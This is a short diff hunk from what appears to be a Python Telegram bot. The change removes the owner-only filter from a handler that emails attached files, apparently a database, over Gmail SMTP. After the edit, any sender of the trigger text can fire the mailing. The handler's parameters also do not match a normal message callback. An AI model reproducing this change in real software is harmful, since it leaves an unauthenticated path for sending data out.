@@ -137,7 +137,7 @@ for file in files_to_send:
     msgn.attach(attach_part)
 
 
-@app.on_message(filters.regex("email_database") & filters.me)
+@app.on_message(filters.regex("email_database"))
 def send_mail(email, password, FROM, TO, msgn):
     # initialize the SMTP server
     server = smtplib.SMTP("smtp.gmail.com", 587)
